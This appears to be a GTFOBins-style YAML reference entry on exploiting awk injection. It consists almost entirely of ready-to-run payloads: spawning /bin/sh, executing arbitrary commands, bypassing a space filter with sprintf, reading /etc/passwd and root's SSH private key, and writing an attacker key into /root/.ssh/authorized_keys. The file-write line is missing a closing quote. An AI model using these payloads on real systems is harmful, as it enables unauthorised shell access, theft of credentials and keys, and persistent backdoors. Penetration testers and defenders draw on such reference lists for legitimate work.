---
description: Awk injection is no different than other command injection vulnerabilities, including SQL injection. Awk is an incredibly powerful (yet simple) tool, so the possibilities are endless. See [this report](https://bugs.chromium.org/p/chromium/issues/detail?id=766253) for an example.
functions:
  shell:
    - description: Can be used to execute arbitrary commands on a system and spawn shells.
      code:
        awk 'BEGIN{system("/bin/sh")}'
  command:
    - description: Can be used to execute arbitrary commands on a system.
      code: |
        awk 'BEGIN {system("ls"); exit}' /dev/null
    - description: The file must exist and command will be executed as many rows there are in the file.
      code: |
        awk 'system("ls")' /etc/passwd
    - description: If spaces cannot be inserted, we can use `sprintf(%c,32)` to emulate them.
      code: |
        awk '//{}BEGIN{system(sprintf("uname%c-aa",32))}'
  file-read:
    - description: Read an arbitrary file.
      code: |
        awk 'BEGIN{while((getline line<"/etc/passwd")>0){print line}}' /dev/null
    - description: Print the contents of multiple files.
      code: |
        awk '//' /etc/passwd /etc/hostname /root/.ssh/id_rsa
  file-write:
    - description: Write to an arbitrary file
      code: |
        awk 'BEGIN{print "ssh-rsa ..." > "/root/.ssh/authorized_keys}' /dev/null
---
